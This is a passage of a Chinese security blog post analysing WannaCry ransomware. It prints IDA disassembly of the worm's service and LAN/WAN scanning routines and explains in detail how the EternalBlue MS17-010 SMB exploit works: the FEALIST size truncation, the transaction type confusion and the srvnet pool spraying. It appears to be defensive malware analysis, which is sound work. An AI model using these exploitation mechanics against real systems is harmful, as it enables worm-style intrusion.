class="line">.text:00407CBF                 pop     ebx</span><br><span class="line">.text:00407CC0                 xor     eax, eax</span><br><span class="line">.text:00407CC2                 pop     edi</span><br><span class="line">.text:00407CC3                 add     esp, 104h</span><br><span class="line">.text:00407CC9                 retn</span><br><span class="line">.text:00407CCA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00407CCA</span><br><span class="line">.text:00407CCA loc_407CCA:                             ; CODE XREF: create_service+32↑j</span><br><span class="line">.text:00407CCA                 xor     eax, eax</span><br><span class="line">.text:00407CCC                 pop     edi</span><br><span class="line">.text:00407CCD                 add     esp, 104h</span><br><span class="line">.text:00407CD3                 retn</span><br><span class="line">.text:00407CD3 create_service  endp</span><br></pre></td></tr></table></figure>
+<p>&emsp;可以看到，<code>create_and_start_service</code>函数首先创建<code>mssecsvc2.0</code>服务并启动，接下来释放<code>tasksche.exe</code>并启动。</p>
+<p>&emsp;<code>mssecsvc2.0</code>服务则负责发送漏洞攻击代码，攻击其他主机，如下所示：</p>
+<p><img src="/images/wannaCry-analysis/image-20230825103915337.png" alt="image-20230825103915337" style="zoom:67%;" /></p>
+<p><img src="/images/wannaCry-analysis/image-20230825103938718.png" alt="image-20230825103938718" style="zoom:67%;" /></p>
+<p>&emsp;由此，进入<code>service_entry</code>函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">.text:00407BD0 service_entry   proc near               ; CODE XREF: service_main+74↓p</span><br><span class="line">.text:00407BD0                 call    init_payload</span><br><span class="line">.text:00407BD5                 test    eax, eax</span><br><span class="line">.text:00407BD7                 jnz     short loc_407BDA</span><br><span class="line">.text:00407BD9                 retn</span><br><span class="line">.text:00407BDA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00407BDA</span><br><span class="line">.text:00407BDA loc_407BDA:                             ; CODE XREF: service_entry+7↑j</span><br><span class="line">.text:00407BDA                 push    ebx</span><br><span class="line">.text:00407BDB                 push    ebp</span><br><span class="line">.text:00407BDC                 push    esi</span><br><span class="line">.text:00407BDD                 push    edi</span><br><span class="line">.text:00407BDE                 mov     edi, ds:_beginthreadex</span><br><span class="line">.text:00407BE4                 push    0</span><br><span class="line">.text:00407BE6                 push    0</span><br><span class="line">.text:00407BE8                 push    0</span><br><span class="line">.text:00407BEA                 push    offset scan_lan</span><br><span class="line">.text:00407BEF                 push    0</span><br><span class="line">.text:00407BF1                 push    0</span><br><span class="line">.text:00407BF3                 call    edi ; _beginthreadex ; 创建线程扫描局域网,利用漏洞传播病毒</span><br><span class="line">.text:00407BF5                 mov     ebp, ds:CloseHandle</span><br><span class="line">.text:00407BFB                 add     esp, 18h</span><br><span class="line">.text:00407BFE                 test    eax, eax</span><br><span class="line">.text:00407C00                 jz      short loc_407C05</span><br><span class="line">.text:00407C02                 push    eax             ; hObject</span><br><span class="line">.text:00407C03                 call    ebp ; CloseHandle</span><br><span class="line">.text:00407C05</span><br><span class="line">.text:00407C05 loc_407C05:                             ; CODE XREF: service_entry+30↑j</span><br><span class="line">.text:00407C05                 mov     ebx, ds:Sleep</span><br><span class="line">.text:00407C0B                 xor     esi, esi</span><br><span class="line">.text:00407C0D</span><br><span class="line">.text:00407C0D loc_407C0D:                             ; CODE XREF: service_entry+65↓j</span><br><span class="line">.text:00407C0D                 push    0</span><br><span class="line">.text:00407C0F                 push    0</span><br><span class="line">.text:00407C11                 push    esi</span><br><span class="line">.text:00407C12                 push    offset scan_wan</span><br><span class="line">.text:00407C17                 push    0</span><br><span class="line">.text:00407C19                 push    0</span><br><span class="line">.text:00407C1B                 call    edi ; _beginthreadex ; 创建线程扫描广域网，利用漏洞传播病毒</span><br><span class="line">.text:00407C1D                 add     esp, 18h</span><br><span class="line">.text:00407C20                 test    eax, eax</span><br><span class="line">.text:00407C22                 jz      short loc_407C27</span><br><span class="line">.text:00407C24                 push    eax             ; hObject</span><br><span class="line">.text:00407C25                 call    ebp ; CloseHandle</span><br><span class="line">.text:00407C27</span><br><span class="line">.text:00407C27 loc_407C27:                             ; CODE XREF: service_entry+52↑j</span><br><span class="line">.text:00407C27                 push    7D0h            ; dwMilliseconds</span><br><span class="line">.text:00407C2C                 call    ebx ; Sleep</span><br><span class="line">.text:00407C2E                 inc     esi</span><br><span class="line">.text:00407C2F                 cmp     esi, 80h ; &#x27;€&#x27;</span><br><span class="line">.text:00407C35                 jl      short loc_407C0D</span><br><span class="line">.text:00407C37                 pop     edi</span><br><span class="line">.text:00407C38                 pop     esi</span><br><span class="line">.text:00407C39                 pop     ebp</span><br><span class="line">.text:00407C3A                 xor     eax, eax</span><br><span class="line">.text:00407C3C                 pop     ebx</span><br><span class="line">.text:00407C3D                 retn</span><br><span class="line">.text:00407C3D service_entry   endp</span><br></pre></td></tr></table></figure>
+<p>&emsp;可以看到，此函数首先初始化payload，之后创建线程执行利用漏洞传播病毒的代码。其中，首先分析<code>init_payload</code>，其中SMB攻击代码逻辑为：释放蠕虫程序，创建进程并执行代码。其次，<code>scan_lan</code>函数则是检查445端口是否开启，若果开启则发送SMB攻击代码。最后，病毒扫描网段判断是否开启SMB协议，若开启则攻击。</p>
+<h2 id="永恒之蓝MS17-010漏洞分析"><a href="#永恒之蓝MS17-010漏洞分析" class="headerlink" title="永恒之蓝MS17-010漏洞分析"></a>永恒之蓝MS17-010漏洞分析</h2><p>&emsp;此漏洞主要利用了微软的3个缺陷。SMB是一个网络文件共享协议，允许应用程序从远端的文件服务器访问文件资源。该漏洞由<code>SMB_COM_TRANSACTION2(0x32)</code>触发，SMB格式如下所示：</p>
+<p>（1）协议头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SMB_Header&#123;</span><br><span class="line">    UCHAR Protocol[4];</span><br><span class="line">    UCHAR Command;</span><br><span class="line">    SMB_ERROR Status;</span><br><span class="line">    UCHAR  Flags;</span><br><span class="line">    USHORT Flags2;</span><br><span class="line">    USHORT PIDHigh;</span><br><span class="line">    UCHAR  SecurityFeatures[8];</span><br><span class="line">    USHORT Reserved;</span><br><span class="line">    USHORT TID;</span><br><span class="line">    USHORT PIDLow;</span><br><span class="line">    USHORT UID;</span><br><span class="line">    USHORT MID;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>（2）协议参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SMB_Parameters&#123;</span><br><span class="line">    UCHAR  WordCount;</span><br><span class="line">    USHORT Words[WordCount] (variable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>（3）协议数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SMB_Data&#123;</span><br><span class="line">    USHORT ByteCount;</span><br><span class="line">    UCHAR  Bytes[ByteCount] (variable);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>（4）对于<code>SMB_COM_TRANSACTION2(0x32)</code>命令协议，其协议参数与数据格式为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SMB_Parameters&#123;</span><br><span class="line">    UCHAR  WordCount;</span><br><span class="line">    Words&#123;</span><br><span class="line">        USHORT TotalParameterCount;</span><br><span class="line">        USHORT TotalDataCount;</span><br><span class="line">        USHORT MaxParameterCount;</span><br><span class="line">        USHORT MaxDataCount;</span><br><span class="line">        UCHAR  MaxSetupCount;</span><br><span class="line">        UCHAR  Reserved1;</span><br><span class="line">        USHORT Flags;</span><br><span class="line">        ULONG  Timeout;</span><br><span class="line">        USHORT Reserved2;</span><br><span class="line">        USHORT ParameterCount;</span><br><span class="line">        USHORT ParameterOffset;</span><br><span class="line">        USHORT DataCount;</span><br><span class="line">        USHORT DataOffset;</span><br><span class="line">        UCHAR  SetupCount;</span><br><span class="line">        UCHAR  Reserved3;</span><br><span class="line">        USHORT Setup[SetupCount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">SMB_Data&#123;</span><br><span class="line">    USHORT ByteCount;&#123;</span><br><span class="line">        UCHAR Name;</span><br><span class="line">        UCHAR Pad1[];</span><br><span class="line">        UCHAR Trans2_Parameters[ParameterCount];</span><br><span class="line">        UCHAR Pad2[];</span><br><span class="line">        UCHAR Trans2_Data[DataCount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>（5）对于<code>SMB_COM_TRANSACTION2(0x32)</code>命令协议，其数据包中FEALIST的格式：</p>
+<p><img src="/images/wannaCry-analysis/image-20230825110532842.png" alt="image-20230825110532842" style="zoom:67%;" /></p>
+<h3 id="利用步骤1-srv-sys的SrvOs2FeaListToNt函数"><a href="#利用步骤1-srv-sys的SrvOs2FeaListToNt函数" class="headerlink" title="利用步骤1  srv.sys的SrvOs2FeaListToNt函数"></a>利用步骤1  srv.sys的SrvOs2FeaListToNt函数</h3><p><img src="/images/wannaCry-analysis/image-20230825110729702.png" alt="image-20230825110729702" style="zoom:67%;" /></p>
+<p>&emsp;此函数用于实现FEALIST转换为对应的NTFEALIST，函数调用SrvOs2FeaListSizeToNt计算FEALIST的长度，但是该函数将cbList的4字节长度保存为2字节长度，导致攻击者可以伪造超长的size，从而导致在之后的SrcOs2FeaToNt池溢出。</p>
+<p>&emsp;由于溢出导致对<code>srvnet.sys</code>分配的<code>srvnet</code>对象内存越界写入，其中覆盖了此对象的<code>srvnet_recv</code>（该指针将会在smb连接结束或断开时被用于寻址函数地址）与<code>MDL</code>，因此可以在某地址写入shellcode。因此覆盖并控制MDL将导致之后的tcp栈实现任意写入伪造对象的操作，覆盖并控制该指针可用于将其指向一个攻击者控制的伪造对象，此时断开smb连接即可导致代码执行。</p>
+<h3 id="利用步骤2-SMB-COM-TRANSACTION2-0x32-协议"><a href="#利用步骤2-SMB-COM-TRANSACTION2-0x32-协议" class="headerlink" title="利用步骤2 SMB_COM_TRANSACTION2(0x32)协议"></a>利用步骤2 SMB_COM_TRANSACTION2(0x32)协议</h3><p>&emsp;如上述漏洞所示可以导致一次越界写，但其前提是FEA LIST的长度必须大于10000，通过分析可以发现FEA LIST只存在于<code>SMB_COM_TRANSACTION2</code>命令的子命令中。如上所示，<code>TotalDataCount</code>是<code>USHORT</code>的，那么，如果发送的数据大小大于<code>0xffff</code>，则会导致溢出。那么，如何发送大于<code>0xffff</code>的数据？</p>
+<p>&emsp;就要利用<code>SMB_COM_TRANSACTION_SECONDARY(0x26)</code>的漏洞。通过抓包可以发现此处发送的并不是<code>SMB_COM_TRANSACTION2</code>子命令的请求包，而是<code>SMB_COM_NT_TRANSACT</code>子命令的请求包，而<code>SMB_COM_NT_TRANSACT</code>子命令中<code>TotalDataCount</code>的类型为<code>ULONG</code>，支持发送大于<code>0xFFFF</code>长度的数据包。</p>
+<p>&emsp;但是<code>SMB_COM_NT_TRANSACT</code>本身是不支持FEALIST的，这里就涉及到<code>SMB_COM_TRANSACTION_SECONDARY(0x26)</code>的漏洞。</p>
+<p>&emsp;在此补充一下，SMB的子命令中存在一个名为TRANSACTION系列的命令：</p>
+<p>（1）SMB_COM_TRANSACTION：用于和邮槽、命名管道进行通信</p>
+<p>（2）SMB_COM_TRANSACTION2：用于打开或创建一个共享文件或文件夹，设置它们的扩展属性</p>
+<p>（3）SMB_COM_NT_TRANSACT：用于打开或创建一个文件或文件夹，并应用扩展属性EA或安全描述符SD</p>
+<p>&emsp;其中产生漏洞的即为对应的SMB_COM_TRANSACTION2命令。对于TRANSACTION系列的命令，如果发送的长度过大，SMB会将该请求包拆分成Second的形式进行发送，如下所示为其相应的Second系列的命令。</p>
+<p>&emsp;服务端根据SMB请求头部的TIP，PID，UID，MID确定哪一个Second属于对应的transtion，而服务端根据最后一个Second确定对应的transtion类型，即如果最后一个Second为SMB_COM_TRANSACTION2_SECONDARY，就按SMB_COM_TRANSACTION2来处理。对于一个transaction，如果没有发送完，后续会跟上对应的Second数据包，<strong>服务端不会检查对应的Second类型，只要保证其TIP，PID，UID，MID匹配，服务端就会将这些数据重新组装还原成一个transaction，而类型由最后一个Second决定</strong>。</p>
+<h3 id="漏洞变种3"><a href="#漏洞变种3" class="headerlink" title="漏洞变种3"></a>漏洞变种3</h3><p>&emsp;为了操纵被溢出的池，该病毒使用内核池喷射技术喷射srvnet对象，该病毒利用<code>SMB_COM_SESSION_SETUP_ANDX(0x73)</code>命令的漏洞进行稳定喷射。在<code>BlockingSessionSetupAndX</code>函数中，如果发送的<code>SMB_COM_SESSION_SETUP_ANDX(0x73)</code>请求中wordcount的类型为12且数据包中的<code>SMB_Parameters</code>的Capabilities含有<code>CAP_EXTENDED_SECURITY</code>标志，但没有<code>FLAGS2_EXTENDED_SECURITY</code>标志，系统会错误的将类型为12的数据包当作类型为13的数据包进行处理，导致服务端从错误的位置读取<code>ByteCount</code>值。因为<code>ByteCount</code>用来计算缓冲区的大小，因此接下来的<code>GetNtSecurityParameters</code>会计算出一个错误的大小，病毒据此控制<code>SrvAllocateNonPagedPool</code>申请内存值的大小。</p>
+
+  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/08/28/malicious-code-analysis-1/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/08/25/frida-reverse-analysis/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+
+
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    <!-- 
+    <div id="disqus_thread" class="ds-thread">
+        <script type="text/javascript">
+            /**
+             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+             */
+                /*
+                 var disqus_config = function () {
+                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
+                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                 };
+                 */
+            (function() { // DON'T EDIT BELOW THIS LINE
+                var d = document, s = d.createElement('script');
+
+                s.src = 'https://https-wd-2711-tech.disqus.com/embed.js';
+
+                s.setAttribute('data-timestamp', +new Date());
+                (d.head || d.body).appendChild(s);
+            })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
+                Disqus.</a></noscript>
+    </div> -->
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            appId: 'wLIJ70s3fPvW8WJPgVVAuWVR-gzGzoHsz',
+            appKey: 'NVGqxhUkqtFv2CbwmXXWjCdR'
+        })
+    </script>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-08-25 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/virus-re/">virus-re<span>2</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90"><span class="toc-article-text">wannacry勒索病毒分析</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#taskche-exe"><span class="toc-article-text">taskche.exe</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#mssecsvc-exe%E8%A0%95%E8%99%AB"><span class="toc-article-text">mssecsvc.exe蠕虫</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-article-text">永恒之蓝MS17-010漏洞分析</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A41-srv-sys%E7%9A%84SrvOs2FeaListToNt%E5%87%BD%E6%95%B0"><span class="toc-article-text">利用步骤1  srv.sys的SrvOs2FeaListToNt函数</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A42-SMB-COM-TRANSACTION2-0x32-%E5%8D%8F%E8%AE%AE"><span class="toc-article-text">利用步骤2 SMB_COM_TRANSACTION2(0x32)协议</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%98%E7%A7%8D3"><span class="toc-article-text">漏洞变种3</span></a></li></ol></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+
+	<!-- copyright -->
+	<div>
+    <ul class="post-copyright">
+      <li class="post-copyright-author">
+      <strong>作者:  </strong>wd-z711</a>
+      </li>
+      <li class="post-copyright-link">
+      <strong>文章链接:  </strong>
+      <a href="/" target="_blank" title="">https://wd-2711.tech/</a>
+      </li>
+      <li class="post-copyright-license">
+        <strong>版权声明:   </strong>
+        本博客所有文章除特别声明外，均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+        许可协议。转载请注明出处!
+      </li>
+    </ul>
+  <div>
+ 	
+
+		
+
+
+</div><!-- row -->
+
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2023 wd-z711
+  
+      <!-- with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
+     <br> Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.     -->
+
+     <!-- <script type="text/javascript">
+      (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+      (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+      e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+      })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+      
+      _st('install','aB-vgeB8gEDrnRJuhceL','2.0.0');
+    </script> -->
+    </p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+   </html>
